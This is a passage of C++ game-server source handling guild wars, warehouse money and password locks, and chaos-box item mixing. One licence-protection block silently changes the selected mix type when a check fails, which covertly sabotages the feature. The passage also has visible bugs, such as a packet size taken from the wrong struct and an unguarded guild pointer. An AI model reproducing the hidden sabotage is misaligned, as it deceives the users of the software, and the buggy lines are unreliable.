	if ( strcmp(lpMyGuild->Names[0], gObj[aIndex].Name ) )
	{
		pMsg.Result = 5;

		// Error on declaring war : 0x05 %s %s
		LogAdd(lMsg.Get(MSGGET(1, 235)),
			lpMyGuild->Names[0], gObj[aIndex].Name);
		DataSend(aIndex, (LPBYTE)&pMsg, pMsg.h.size);

		return;
	}


	char _guildname[MAX_GUILD_LEN+1];
	memset(_guildname, 0, sizeof(_guildname));
	memcpy(_guildname, GuildName, MAX_GUILD_LEN);

	if ( !strncmp(lpMyGuild->Name, GuildName, MAX_GUILD_LEN))
		return;

	_GUILD_INFO_STRUCT * lpNode = Guild.SearchGuild(_guildname);

	if ( lpNode )
	{
		if ( lpNode->WarState == 1 || lpNode->WarDeclareState == 1 )
		{
			pMsg.Result = 4;

			//Error on declaring war : %d %d %s
			LogAdd(lMsg.Get(MSGGET(1, 234)), lpNode->WarState,
				lpNode->WarDeclareState, lpNode->Name);
			DataSend(aIndex, (LPBYTE)&pMsg, pMsg.h.size);

			return;
		}

		if ( lpMyGuild->iGuildUnion != 0 && lpMyGuild->iGuildUnion == lpNode->iGuildUnion )
		{
			LogAddTD("[U.System][Guildwar] Can't declare guildwar between Same Union (%s / %d) <-> (%s / %d)",
				lpMyGuild->Name, lpMyGuild->iGuildUnion, lpNode->Name, lpMyGuild->iGuildUnion);

			return;
		}


	
	if(Gens.Enabled == 1)
	{
		if(Gens.AllowWarWithSameGensFam == 0)
		{
			if (lpMyGuild->GensFam != 0 && lpNode->GensFam != 0)
			{
				if(lpMyGuild->GensFam == lpNode->GensFam )
				{
					GCServerMsgStringSend("You cant make War with same Gens Family", aIndex, 1);
					return;
				}
			}
		}
	}

	if(lpMyGuild->TotalCount < ReadConfig.GCGuildWarRequestResult_GuildWarMemberReq)
	{
		char buf[100]={0};
		wsprintf(buf,"Your guild must have %d members for declare a war!",ReadConfig.GCGuildWarRequestResult_GuildWarMemberReq);
		GCServerMsgStringSend(buf, aIndex, 1);
		return;
	}
	if(lpNode->TotalCount < ReadConfig.GCGuildWarRequestResult_GuildWarMemberReq)
	{
		char buf[100]={0};
		wsprintf(buf,"Target guild must have %d members for declare a war!",ReadConfig.GCGuildWarRequestResult_GuildWarMemberReq);
		GCServerMsgStringSend(buf, aIndex, 1);
		return;
	}

		int n=0;	// #warning Change this 0 to OBJ_STARTUSERINDEX
		int warmaster=-1;

		while ( true )
		{
			if ( gObj[n].Type == OBJ_USER )
			{
				if ( gObj[n].Connected > PLAYER_LOGGED )
				{
					if ( gObj[n].Name[0] == lpNode->Names[0][0] )
					{
						if ( !strcmp(gObj[n].Name, lpNode->Names[0]))
						{
							if ( PvP.gPkLimitFree == FALSE && gObj[n].m_PK_Level >= 6)
							{
								pMsg.Result = 4;

								LogAdd("Error on declaring war : Target GuildMaster Is Murderer 0x04 %s %s",
									lpMyGuild->Names[0], gObj[aIndex].Name);

								DataSend(aIndex, (LPBYTE)&pMsg, pMsg.h.size);

								return;
							}

							warmaster = n;
							break;
						}
					}
				}
			}

			if ( n < OBJMAX-1 )
				n++;
			else
				break;
		}
		
		if ( warmaster >= 1 )
		{
			if ( CC_MAP_RANGE(gObj[aIndex].MapNumber) || CC_MAP_RANGE(gObj[warmaster].MapNumber) )
			{
				GCServerMsgStringSend(lMsg.Get(MSGGET(4, 199)), aIndex, 1);
				return;
			}

			if ( (gObj[warmaster].m_Option&1) != 1 )
			{
				pMsg.Result = 4;
				DataSend(aIndex, (LPBYTE)&pMsg, pMsg.h.size);

				return;
			}

			pMsg.Result = 1;
			DataSend(aIndex, (LPBYTE)&pMsg, pMsg.h.size);
			GCGuildWarRequestSend(lpMyGuild->Name, warmaster, type);
			lpMyGuild->WarDeclareState = 1;
			lpNode->WarDeclareState = 1;
			lpMyGuild->WarType = type;
			lpNode->WarType = type;

			// Declared guild war [%s][%s] sGuild:(%s) TargetGuild:(%s)
			LogAddTD(lMsg.Get(MSGGET(1, 236)), gObj[aIndex].AccountID, gObj[aIndex].Name,
				lpMyGuild->Name, lpNode->Name);

			strcpy(lpMyGuild->TargetGuildName, lpNode->Name);
			strcpy(lpNode->TargetGuildName, lpMyGuild->Name);
			lpMyGuild->lpTargetGuildNode = lpNode;
			lpNode->lpTargetGuildNode = lpMyGuild;
		}
		else
		{
			pMsg.Result = 2;
			DataSend(aIndex, (LPBYTE)&pMsg, pMsg.h.size);

			//return;
		}
	}
	else
	{
		pMsg.Result = 0;
		DataSend(aIndex, (LPBYTE)&pMsg, pMsg.h.size);

		return;
	}
	#else
		return;
#endif
}



struct PMSG_GUILDWARSEND
{
	PBMSG_HEAD h;	// C1:61
	char GuildName[8];	// 3
	BYTE Type;	// B
};


void GCGuildWarRequestSend(LPSTR GuildName, int aIndex, int type) //GS-CS OK
{
#if (GS_CASTLE==0)
	PMSG_GUILDWARSEND pMsg;

	PHeadSetB((LPBYTE)&pMsg, 0x61, sizeof(pMsg));
	pMsg.Type = type;
	memcpy(pMsg.GuildName, GuildName, MAX_GUILD_LEN);

	DataSend(aIndex, (LPBYTE)&pMsg, pMsg.h.size);

	// (%s) guild declared guild war
	LogAddTD(lMsg.Get(MSGGET(1, 237)), GuildName);
#endif
}

struct PMSG_GUILDWAR_DECLARE
{
	PBMSG_HEAD h;	// C1:62
	char GuildName[8];	// 3
	BYTE Type;	// B
	BYTE TeamCode;	// C
};


void GCGuildWarRequestSendRecv(PMSG_GUILDWARSEND_RESULT * lpMsg, int aIndex)
{
#if (GS_CASTLE==0)
	if(OBJMAX_RANGE(aIndex) == 0)
	{
		return;
	}

	PMSG_GUILDWAR_DECLARE pMsg;
	int count=0;
	int g_call=0;
	
	PHeadSetB((LPBYTE)&pMsg, 0x62, sizeof(pMsg));
	pMsg.Type = 0;
	
	_GUILD_INFO_STRUCT * lpMyNode = gObj[aIndex].lpGuild;

	if ( !lpMyNode )
	{
		PMSG_GUILDWARREQUEST_RESULT pResult;

		pResult.h.c = 0xC1;
		pResult.h.headcode = 0x60;
		pResult.h.size = sizeof(pMsg);	// #error Change fro pResult
		pResult.Result = 0;

		DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);
		return;
	}

	if ( lpMyNode->lpTargetGuildNode && lpMsg->Result )
	{
		int iTarGetIndex = lpMyNode->lpTargetGuildNode->Index[0];

		if ( BC_MAP_RANGE(gObj[iTarGetIndex].MapNumber) ||
			 CC_MAP_RANGE(gObj[iTarGetIndex].MapNumber) ||
			 IT_MAP_RANGE(gObj[iTarGetIndex].MapNumber) ||
#if (PACK_EDITION>=2)
			 IMPERIALGUARDIAN_MAP_RANGE(gObj[iTarGetIndex].MapNumber) ||
#endif
#if (PACK_EDITION>=3)
			 DG_MAP_RANGE(gObj[iTarGetIndex].MapNumber) ||
#endif
			 DS_MAP_RANGE(gObj[iTarGetIndex].MapNumber)  )
		{
			PMSG_NOTICE pNotice;
			pNotice.type = 0;	// 3
			pNotice.btCount = 0;	// 4
			pNotice.wDelay = 0;	// 6	
			pNotice.dwColor = 0;	// 8
			pNotice.btSpeed = 0;	// C

			TNotice::MakeNoticeMsgEx(&pNotice, 1, lMsg.Get(MSGGET(4, 199)));

			DataSend(aIndex, (LPBYTE)&pNotice, pNotice.h.size);

			lpMsg->Result = 0;
		}
	}

	pMsg.Type = lpMyNode->WarType;

	if ( lpMsg->Result == 0 )
	{
		if ( lpMyNode->lpTargetGuildNode )
		{
			if ( lpMyNode->lpTargetGuildNode->WarDeclareState == 1 )
			{
				lpMyNode->lpTargetGuildNode->WarDeclareState = 0;
				lpMyNode->WarDeclareState = 0;

				PMSG_GUILDWARREQUEST_RESULT pResult;

				PHeadSetB((LPBYTE)&pResult, 0x60, sizeof(pResult));
				pResult.Result = 6;

				if ( lpMyNode->lpTargetGuildNode->Index[0] >= 0 )
				{
					DataSend(lpMyNode->lpTargetGuildNode->Index[0], (LPBYTE)&pResult, pResult.h.size);
				}
			}
		}
	}
	else //if ( lpMsg->Result == 1 )
	{
		if ( lpMyNode->WarDeclareState == 1 )
		{
			if ( lpMyNode->lpTargetGuildNode )
			{
				if (lpMyNode->lpTargetGuildNode->WarDeclareState == 1 )
				{
					PMSG_TELEPORT pTeleportMsg;

					if ( lpMyNode->WarType == 1 )
					{
						lpMyNode->BattleGroundIndex = gCheckBlankBattleGround();

						switch ( lpMyNode->BattleGroundIndex )
						{
							case 0xFF:
								lpMyNode->WarDeclareState = 0;
								lpMyNode->WarState = 0;
								lpMyNode->lpTargetGuildNode->WarDeclareState = 0;
								lpMyNode->lpTargetGuildNode->WarState = 0;

								PMSG_GUILDWARREQUEST_RESULT pResult;

								PHeadSetB((LPBYTE)&pResult, 0x60, sizeof(pResult));
								pResult.Result = 4;

								DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);
								return;
						}
	
						pTeleportMsg.MoveNumber = 51;
						lpMyNode->lpTargetGuildNode->BattleGroundIndex = lpMyNode->BattleGroundIndex;

						if ( gBSGround[0]->m_BallIndex >= 0 )
							gObjMonsterRegen(&gObj[gBSGround[0]->m_BallIndex]);

						BattleSoccerGoalEnd(0);
						lpMyNode->PlayScore = 0;
						lpMyNode->lpTargetGuildNode->PlayScore = 0;
						gBattleGroundEnable(lpMyNode->BattleGroundIndex, TRUE);
						gSetBattleTeamMaster(lpMyNode->BattleGroundIndex, 0, lpMyNode->Name, lpMyNode);
						gSetBattleTeamMaster(lpMyNode->BattleGroundIndex, 1, lpMyNode->lpTargetGuildNode->Name, lpMyNode->lpTargetGuildNode);
					}
					
					lpMyNode->WarDeclareState = 2;
					lpMyNode->WarState = 1;
					lpMyNode->lpTargetGuildNode->WarDeclareState = 2;
					lpMyNode->lpTargetGuildNode->WarState = 1;
					lpMyNode->PlayScore = 0;
					lpMyNode->lpTargetGuildNode->PlayScore = 0;
					lpMyNode->BattleTeamCode = 0;
					lpMyNode->lpTargetGuildNode->BattleTeamCode = 1;
					memset(pMsg.GuildName, 0, sizeof(pMsg.GuildName));
					memcpy(pMsg.GuildName, lpMyNode->lpTargetGuildNode->Name, sizeof(pMsg.GuildName));
					pMsg.TeamCode = lpMyNode->BattleTeamCode;
					count = 0;

					for ( int n=0;n<MAX_USER_GUILD;n++)
					{
						if ( lpMyNode->Use[n] )
						{
							if ( lpMyNode->Index[n] >= 0 )
							{
								g_call = 0;

								if ( n > 0 )
								{
									if ( lpMyNode->WarType == 1 )
									{
										if ( gObj[lpMyNode->Index[0]].PartyNumber  >= 0 )
										{
											if ( gObj[lpMyNode->Index[0]].PartyNumber == gObj[lpMyNode->Index[n]].PartyNumber )
											{
												g_call = 1;
											}
										}
									}
									else 
									{
										g_call = 1;
									}
								}
								else if ( n== 0 )
								{
									g_call = 1;
								}

								if ( g_call )
								{
									DataSend(lpMyNode->Index[n], (LPBYTE)&pMsg, pMsg.h.size);

									// Declared guild war against (%s)
									LogAddTD(lMsg.Get(MSGGET(1, 238)), lpMyNode->Name);
									GCGuildWarScore(lpMyNode->Index[n]);
									int x = 60;

									if ( lpMyNode->WarType == 1 )
									{
										gObj[lpMyNode->Index[n]].IsInBattleGround = true;
										pTeleportMsg.MoveNumber = 51;

										if ( PvP.gPkLimitFree || gObj[lpMyNode->Index[n]].m_PK_Level < 6 )
										{
											gObjTeleport(lpMyNode->Index[n], 6, x++, 153);
											count++;
										}
									}
								}
							}
						}
					}

					memset(pMsg.GuildName, 0, sizeof(pMsg.GuildName));
					memcpy(pMsg.GuildName, lpMyNode->Name, sizeof(pMsg.GuildName));

					pMsg.TeamCode = lpMyNode->lpTargetGuildNode->BattleTeamCode;
					count = 0;

					for ( int n=0;n<MAX_USER_GUILD;n++)
					{
						if ( lpMyNode->lpTargetGuildNode->Use[n] )
						{
							if ( lpMyNode->lpTargetGuildNode->Index[n] >= 0 )
							{
								g_call = 0;

								if ( n > 0 )
								{
									if ( lpMyNode->WarType == 1 )
									{
										if ( gObj[lpMyNode->lpTargetGuildNode->Index[0]].PartyNumber  >= 0 )
										{
											if ( gObj[lpMyNode->lpTargetGuildNode->Index[0]].PartyNumber == gObj[lpMyNode->lpTargetGuildNode->Index[n]].PartyNumber )
											{
												g_call = 1;
											}
										}
									}
									else 
									{
										g_call = 1;
									}
								}
								else if ( n== 0 )
								{
									g_call = 1;
								}

								if ( g_call )
								{
									DataSend(lpMyNode->lpTargetGuildNode->Index[n], (LPBYTE)&pMsg, pMsg.h.size);

									// Declared guild war against (%s)
									LogAddTD(lMsg.Get(MSGGET(1, 238)), lpMyNode->lpTargetGuildNode->Name);
									GCGuildWarScore(lpMyNode->lpTargetGuildNode->Index[n]);
									int x = 59;

									if ( lpMyNode->lpTargetGuildNode->WarType == 1 )
									{

										if ( PvP.gPkLimitFree != 0 || gObj[lpMyNode->lpTargetGuildNode->Index[n]].m_PK_Level < 6 )
										{
											gObj[lpMyNode->lpTargetGuildNode->Index[n]].IsInBattleGround = true;
											gObjTeleport(lpMyNode->lpTargetGuildNode->Index[n], 6, x++, 164);
											count++;
										}
									}
								}
							}
						}
					}

					cManager.BattleInfoSend(GetBattleTeamName(0,0),
											GetBattleTeamScore(0,0),
											GetBattleTeamName(0, 1),
											GetBattleTeamScore(0,1));

					if ( lpMyNode->WarType == 1 )
					{
						gObjAddMsgSendDelay(&gObj[aIndex], 5, aIndex, 10000, 0);
						GCServerMsgStringSendGuild(lpMyNode->lpTargetGuildNode,lMsg.Get(MSGGET(4, 130)), 1);
						GCServerMsgStringSendGuild(lpMyNode,lMsg.Get(MSGGET(4, 130)), 1);
					}
				}
			}
		}
	}
#else
	return;
#endif
}


void GCGuildWarDeclare(int aIndex, LPSTR _guildname)
{
#if (GS_CASTLE==0)
	PMSG_GUILDWAR_DECLARE pMsg;

	PHeadSetB((LPBYTE)&pMsg, 0x62, sizeof(pMsg));
	memcpy(pMsg.GuildName, _guildname, sizeof(pMsg.GuildName));

	DataSend(aIndex, (LPBYTE)&pMsg, pMsg.h.size);
#endif
}


struct PMSG_GUILDWAR_END
{
	PBMSG_HEAD h;	// C1:63
	BYTE Result;	// 3
	char GuildName[8];	// 4
};


void GCGuildWarEnd(int aIndex, BYTE result, char* _guildname)
{
#if (GS_CASTLE==0)
	PMSG_GUILDWAR_END pMsg;

	PHeadSetB((LPBYTE)&pMsg, 0x63, sizeof(pMsg));
	pMsg.Result = result;
	memcpy(pMsg.GuildName, _guildname, sizeof(pMsg.GuildName));

	DataSend(aIndex, (LPBYTE)&pMsg, pMsg.h.size);
#endif
}

struct PMSG_GUILDSCORE
{
	PBMSG_HEAD h;	// C1:64
	BYTE Score1;	// 3
	BYTE Score2;	// 4
	BYTE Type;	// 5
};



void GCGuildWarScore(int aIndex)
{
#if (GS_CASTLE==0)
	if(OBJMAX_RANGE(aIndex) == 0)
	{
		return;
	}

	if ( gObj[aIndex].GuildNumber < 1 )
		return;

	PMSG_GUILDSCORE pMsg;

	PHeadSetB((LPBYTE)&pMsg, 0x64, sizeof(pMsg));
	pMsg.Score1 = 0;
	pMsg.Score2 = 0;
	pMsg.Type = 0;

	if ( gObj[aIndex].lpGuild != NULL )
	{
		pMsg.Score1 = gObj[aIndex].lpGuild->PlayScore;
		LogAdd("Score %s %d", gObj[aIndex].Name, gObj[aIndex].lpGuild->PlayScore);
	}

	if ( gObj[aIndex].lpGuild->lpTargetGuildNode != NULL )
	{
		pMsg.Score2 = gObj[aIndex].lpGuild->lpTargetGuildNode->PlayScore;
		LogAdd("Target Score %s %d", gObj[aIndex].Name, gObj[aIndex].lpGuild->lpTargetGuildNode->PlayScore);
	}

	DataSend(aIndex, (LPBYTE)&pMsg, pMsg.h.size);
#endif
}	


void CGWarehouseMoneyInOut(int aIndex, PMSG_WAREHOUSEMONEYINOUT* lpMsg)
{
	int money = 0;

	if ( !gObjIsConnected(aIndex))
	{
		LogAddC(2, "error-L3 [%s][%d]", __FILE__, __LINE__);
		GCWarehouseInventoryMoneySend(aIndex, 0, 0, 0);
		return;
	}

	LPOBJ lpObj = &gObj[aIndex];
	money = lpMsg->Money;
	
	if ( lpObj->m_IfState.state == 0 )
	{
		GCWarehouseInventoryMoneySend(aIndex, 0, 0, 0);
		return;
	}

	if ( lpObj->m_IfState.use < 1 || lpObj->m_IfState.type != 6 )
	{
		GCWarehouseInventoryMoneySend(aIndex, 0, 0, 0);
		LogAdd("[%s][%s] error-L1 : used not Warehouse",
			gObj[aIndex].AccountID, gObj[aIndex].Name);

		return;
	}

	switch ( lpMsg->Type )
	{
		case 0x00:
			if ( money <= 0 || money > MAX_WAREHOUSE_ZEN )
			{
				GCWarehouseInventoryMoneySend(aIndex, 0, 0, 0);
				return;
			}

			if ( (lpObj->WarehouseMoney+money) > MAX_WAREHOUSE_ZEN )
			{
				GCWarehouseInventoryMoneySend(aIndex, 0, 0, 0);
				return;
			}

			if ( money > lpObj->Money )
			{
				GCWarehouseInventoryMoneySend(aIndex, 0, 0, 0);
				return;
			}

			lpObj->Money-=money;
			lpObj->WarehouseMoney+=money;
			break;
		case 0x01:
			{
				if ( bCanWarehouseLock == TRUE)
				{
					if ( lpObj->WarehouseLock == 1)
					{
						GCWarehouseInventoryMoneySend(aIndex, 0, 0, 0);
						GCServerMsgStringSend(lMsg.Get(MSGGET(6, 70)), lpObj->m_Index,1);
						return;
					}
				}

				if ( money <= 0 || money > MAX_WAREHOUSE_ZEN )
				{
					GCWarehouseInventoryMoneySend(aIndex, 0, 0, 0);
					return;
				}
				
				if ( money > lpObj->WarehouseMoney )
				{
					GCWarehouseInventoryMoneySend(aIndex, 0, 0, 0);
					return;
				}

				lpObj->WarehouseMoney -= money;
				lpObj->Money += money;
				int rZen = GetWarehouseUsedHowMuch(lpObj->Level, lpObj->WarehousePW);

				if ( (lpObj->Money-rZen) > 0 )
				{
					int oldmoney = lpObj->Money;
					lpObj->Money -= rZen;
					GCMoneySend(lpObj->m_Index, lpObj->Money);
					
					LogAdd("Get WareHouse Money(In Inventory) : %d - %d = %d",
						oldmoney, rZen, lpObj->Money);
				}
				else if ( (lpObj->WarehouseMoney-rZen) > 0 )
				{
					int oldmoney = lpObj->WarehouseMoney;
					lpObj->WarehouseMoney -= rZen;

					LogAdd("Get WareHouse Money(In WareHouse) : %d - %d = %d",
						oldmoney, rZen, lpObj->WarehouseMoney);

					GCWarehouseInventoryMoneySend(aIndex, 1, lpObj->Money, lpObj->WarehouseMoney);
				}
				else
				{
					lpObj->WarehouseMoney +=money;
					lpObj->Money -= money;
					GCWarehouseInventoryMoneySend(aIndex, 0, 0, 0);
					char msg[255];

					wsprintf(msg, lMsg.Get(MSGGET(6, 69)), rZen);
					GCServerMsgStringSend(msg, lpObj->m_Index, 1);
					return;
				}
			}
			break;

		default:
			GCWarehouseInventoryMoneySend(aIndex, 0, 0, 0);
			return;
	}

	//lpObj->WarehouseCount++;
	GCWarehouseInventoryMoneySend(aIndex, 1, lpObj->Money, lpObj->WarehouseMoney);
}



struct PMSG_MONEY
{
	PBMSG_HEAD h;	// C1:81
	BYTE Result;	// 3
	int wMoney;	// 4
	int iMoney;	// 8
};


void GCWarehouseInventoryMoneySend(int aIndex, BYTE result, int money, int wmoney)
{
	PMSG_MONEY pMsg;

	PHeadSetB((LPBYTE)&pMsg, 0x81, sizeof(pMsg));
	pMsg.Result = result;
	pMsg.iMoney = money;
	pMsg.wMoney = wmoney;

	DataSend(aIndex, (LPBYTE)&pMsg, pMsg.h.size);
}




void CGWarehouseUseEnd(int aIndex)
{
	if ( !gObjIsConnectedGP(aIndex))
	{
		LogAddC(2, "error-L3 [%s][%d]", __FILE__, __LINE__);
		return;
	}

	LPOBJ lpObj = &gObj[aIndex];

	PMSG_DEFAULT pMsg;
	PHeadSetB((LPBYTE)&pMsg, 0x82, sizeof(pMsg));
	DataSend(aIndex, (LPBYTE)&pMsg, pMsg.h.size);

	gObjItemTextSave(lpObj);
	GDSetWarehouseList(aIndex);
	GDUserItemSave(lpObj);

	//#if (WL_PROTECT==1)  
	//	VM_START_WITHLEVEL(19)
	//	if(WLRegGetStatus(NULL) != 1)
	//	{
	//		ReadConfig.SkillGhostPhantom_Div = 0;
	//	}
	//	VM_END
	//#endif

	if ( lpObj->m_IfState.use  && lpObj->m_IfState.type == 6 )
	{
		lpObj->m_IfState.use = 0;
		lpObj->m_IfState.state = 0;
		lpObj->WarehouseSave = FALSE;
	}
}




struct PMSG_WAREHOUSESTATE
{
	PBMSG_HEAD h;	// C1:83
	BYTE State;	// 3
};



void GCWarehouseStateSend(int aIndex, BYTE state)
{
	PMSG_WAREHOUSESTATE pMsg;

	PHeadSetB((LPBYTE)&pMsg, 0x83, sizeof(pMsg));
	pMsg.State = state;

	DataSend(aIndex, (LPBYTE)&pMsg, pMsg.h.size);
}




void GCWarehouseRecivePassword(int aIndex, PMSG_WAREHOUSEPASSSEND* lpMsg)
{
	if(OBJMAX_RANGE(aIndex) == 0)
	{
		return;
	}

	if ( bCanWarehouseLock == FALSE )
		return;

	int pw = lpMsg->Pass;

	switch ( lpMsg->Type )
	{
		case 0x00:
			if ( gObj[aIndex].WarehouseLock )
			{
				if ( gObj[aIndex].WarehousePW == pw )
				{
					gObj[aIndex].WarehouseLock = FALSE;
					GCWarehouseStateSend(aIndex, 0x0C);
				}
				else
				{
					GCWarehouseStateSend(aIndex, 0x0A);
				}
			}
			break;
		case 0x01:
			if ( !gObj[aIndex].WarehouseLock || gObj[aIndex].WarehouseLock == 0xFF )
			{
				char szJoomin[11];

				memset(szJoomin, 0, sizeof(szJoomin));
				memcpy(szJoomin, lpMsg->LastJoominNumber, 10);

				if ( gObjJoominCheck(aIndex, szJoomin) == FALSE )
				{
					GCWarehouseStateSend(aIndex, 0x0D);
					return;
				}

				gObj[aIndex].WarehousePW = pw;
				gObj[aIndex].WarehouseLock = FALSE;
				GCWarehouseStateSend(aIndex, 0x0C);
			}
			else
			{
				GCWarehouseStateSend(aIndex, 0x0B);
			}
			break;
		case 0x02:
			{
				char szJoomin[11];

				memset(szJoomin, 0, sizeof(szJoomin));
				memcpy(szJoomin, lpMsg->LastJoominNumber, 10);

				if ( gObjJoominCheck(aIndex, szJoomin) == FALSE )
				{
					GCWarehouseStateSend(aIndex, 0x0D);
					return;
				}

				gObj[aIndex].WarehouseLock = FALSE;
				gObj[aIndex].WarehousePW = 0;
				GCWarehouseStateSend(aIndex, gObj[aIndex].WarehouseLock);
			}
			break;
	}
}	




void GCUserChaosBoxSend(LPOBJ lpObj, int iChaosBoxType)
{
	/*if ( iChaosBoxType == 1  )
	{
		if ( lpObj->m_IfState.type != 13 )
		{
			return;
		}

		if ( lpObj->m_IfState.type == 13 && lpObj->m_IfState.state == 1 )
		{
			return;
		}
	}
	else 
	{
		if ( lpObj->m_IfState.type != 7 )
		{
			return;
		}

		if ( lpObj->m_IfState.type == 7 && lpObj->m_IfState.state == 1 )
		{
			return;
		}
	}*/

	PMSG_SHOPITEMCOUNT pMsg;
	BYTE SendByte[2048];
	int lOfs = sizeof(pMsg);
	PHeadSetW((LPBYTE)&pMsg, 0x31, 0);
	pMsg.count = 0;

	if ( iChaosBoxType == 1 )
	{
		pMsg.Type = 5;
	}
	else
	{
		pMsg.Type = 3;
	}

	for ( int n=0;n<CHAOS_BOX_SIZE;n++)
	{
		if ( lpObj->pChaosBox[n].IsItem() == TRUE )
		{
			SendByte[lOfs] = n;
			lOfs++;
			ItemByteConvert(&SendByte[lOfs], lpObj->pChaosBox[n] );
			lOfs += MAX_ITEM_INFO;
			pMsg.count ++;
		}
	}

	pMsg.h.sizeH = SET_NUMBERH(lOfs);
	pMsg.h.sizeL = SET_NUMBERL(lOfs);
	memcpy(SendByte, &pMsg, sizeof(pMsg));

	DataSend(lpObj->m_Index, SendByte, lOfs);
}




void CGChaosBoxItemMixButtonClick(PMSG_CHAOSMIX* aRecv, int aIndex)
{
	if ( !gObjIsConnectedGP(aIndex))
	{
		CHAOS_LOG.Output("error-L3 [%s][%d]", __FILE__, __LINE__);
		//CHAOS_LOG.Output(2, "error-L3 [%s][%d]", __FILE__, __LINE__);
		return;
	}

	LPOBJ lpObj = &gObj[aIndex];

	if ( lpObj->ChaosLock == TRUE )
	{
		CHAOS_LOG.Output("[%s][%s] Already Used Chaos",
			lpObj->AccountID, lpObj->Name);

		GCServerMsgStringSend(lMsg.Get(MSGGET(2, 198)), lpObj->m_Index, 1);
		return;
	}

	if ( lpObj->m_bPShopOpen == true )
	{
		CHAOS_LOG.Output("[%s][%s] is Already Opening PShop, ChaosBox Failed",
			lpObj->AccountID, lpObj->Name);

		GCServerMsgStringSend(lMsg.Get(MSGGET(4, 194)), lpObj->m_Index, 1);
		return;
	}

	lpObj->bIsChaosMixCompleted = true;
	int iMixType = aRecv->Type;

#if (WL_PROTECT==1)
		VM_START_WITHLEVEL(3)
		int MyCheckVar;  
		CHECK_PROTECTION(MyCheckVar, 0x04167638)  	 
		if (MyCheckVar != 0x04167638)
		{
			iMixType += 2;
		}
		VM_END
#endif
	
	switch ( iMixType )	// TEST - Good
	{
		case CHAOS_TYPE_DEVILSQUARE:
			DevilSquareItemChaosMix(lpObj);
			break;
		case CHAOS_TYPE_UPGRADE_10:
			PlusItemLevelChaosMix(lpObj, CHAOS_TYPE_UPGRADE_10);
			break;
		case CHAOS_TYPE_UPGRADE_11:
			PlusItemLevelChaosMix(lpObj, CHAOS_TYPE_UPGRADE_11);
			break;
		case CHAOS_TYPE_UPGRADE_12:
			PlusItemLevelChaosMix(lpObj, CHAOS_TYPE_UPGRADE_12);
			break;
		case CHAOS_TYPE_UPGRADE_13:
			PlusItemLevelChaosMix(lpObj, CHAOS_TYPE_UPGRADE_13);
			break;
		case CHAOS_TYPE_UPGRADE_14:
			PlusItemLevelChaosMix(lpObj, CHAOS_TYPE_UPGRADE_14);
			break;
		case CHAOS_TYPE_UPGRADE_15:
			PlusItemLevelChaosMix(lpObj, CHAOS_TYPE_UPGRADE_15);
			break;
		case CHAOS_TYPE_DINORANT:
			PegasiaChaosMix(lpObj);
			break;
		case CHAOS_TYPE_FRUIT:
			CircleChaosMix(lpObj);
			break;
		case CHAOS_TYPE_CONDOR_FEATHER:
		case CHAOS_TYPE_THIRD_WING:	
			Wing3ChaosMix(lpObj);
			break;
		case CHAOS_TYPE_SECOND_WING:
		case CHAOS_TYPE_CLOAK:
			WingChaosMix(lpObj);
			break;
		case CHAOS_TYPE_BLOODCATLE:
			BloodCastleItemChaosMix(lpObj);
			break;
		case CHAOS_TYPE_DEFAULT:
		case CHAOS_TYPE_FIRST_WING:
			DefaultChaosMix(lpObj);
			break;
		//case CHAOS_TYPE_SETITEM:	// #warning Activate this to SetItemChaosMix
			//SetItemChaosMix(lpObj);
			//break;
		case CHAOS_TYPE_DARKHORSE:
			DarkHorseChaosMix(lpObj);
			break;
		case CHAOS_TYPE_DARKSPIRIT:
			DarkSpiritChaosMix(lpObj);
			break;
		case CHAOS_TYPE_BLESS_POTION:
			BlessPotionChaosMix(lpObj);
			break;
		case CHAOS_TYPE_SOUL_POTION:
			SoulPotionChaosMix(lpObj);
			break;
		case CHAOS_TYPE_LIFE_STONE:
			LifeStoneChaosMix(lpObj);
			break;
#if (GS_CASTLE==1)
		case CHAOS_TYPE_CASTLE_SPECIAL_ITEM_MIX:
			CastleSpecialItemMix(lpObj);
			break;
#endif
		case CHAOS_TYPE_HT_BOX:
			HiddenTreasureBoxItemMix(lpObj);
			break;
		case CHAOS_TYPE_FENRIR_01:
			Fenrir_01Level_Mix(lpObj);
			break;
		case CHAOS_TYPE_FENRIR_02:
			Fenrir_02Level_Mix(lpObj);
			break;
		case CHAOS_TYPE_FENRIR_03:
			Fenrir_03Level_Mix(lpObj);
			break;
		case CHAOS_TYPE_FENRIR_04:
			Fenrir_04Upgrade_Mix(lpObj);
			break;
		case CHAOS_TYPE_COMPOUNDPOTION_LV1:
			ShieldPotionLv1_Mix(lpObj);
			break;
		case CHAOS_TYPE_COMPOUNTPOTION_LV2:
			ShieldPotionLv2_Mix(lpObj);
			break;
		case CHAOS_TYPE_COMPOUNTPOTION_LV3:
			ShieldPotionLv3_Mix(lpObj);
			break;
		case CHAOS_TYPE_JEWELOFHARMONY_PURITY:
			g_kJewelOfHarmonySystem.PurityJewelOfHarmony(lpObj);
			break;
		case CHAOS_TYPE_JEWELOFHARMONY_MIX_SMELTINGITEM:
			g_kJewelOfHarmonySystem.MakeSmeltingStoneItem(lpObj);
			break;
		case CHAOS_TYPE_JEWELOFHARMONY_RESTORE_ITEM:
			g_kJewelOfHarmonySystem.RestoreStrengthenItem(lpObj);
			break;
		case CHAOS_TYPE_380_OPTIONITEM:
			g_kItemSystemFor380.ChaosMix380ItemOption(lpObj);
			break;

		case CHAOS_TYPE_CHERRYBLOSSOM:
			CherryBlossom.GetReward(lpObj->m_Index);
			break;

		case CHAOS_TYPE_LOTTERY_MIX: //JPN STUFF
			LotteryItemMix(lpObj);
			break;

		case CHAOS_TYPE_OLD_PAPER:
			IllusionTempleItemMix(lpObj);
			break;

		case CHAOS_TYPE_SEED_JEWEL:
			ExtractSeedChaosMix(lpObj);
			break;

		case CHAOS_TYPE_SEED_SPEAR:
			SocketSeedChaosMix(lpObj);
			break;

		case CHAOS_TYPE_SOCKET_ITEM_ADD:
			SocketItemAddChaosMix(lpObj,aRecv->unk);
			break;

		case CHAOS_TYPE_SOCKET_ITEM_DEL:
			SocketItemDelChaosMix(lpObj,aRecv->unk);
			break;
#if (PACK_EDITION>=2)
		case CHAOS_TYPE_IMPERIALGUARDIANTICKET:
			ImperialGuardianItemChaosMix(lpObj);
			break;
#endif
		case CHAOS_TYPE_NEWBOX_MIX:
			NewBoxItemChaosMix(lpObj);
			break;
		case CHAOS_TYPE_LUCKYITEM_CREATE:
			LuckyCardItemChaosMix(lpObj);
			break;
		case CHAOS_TYPE_LUCKYITEM_REFINE:
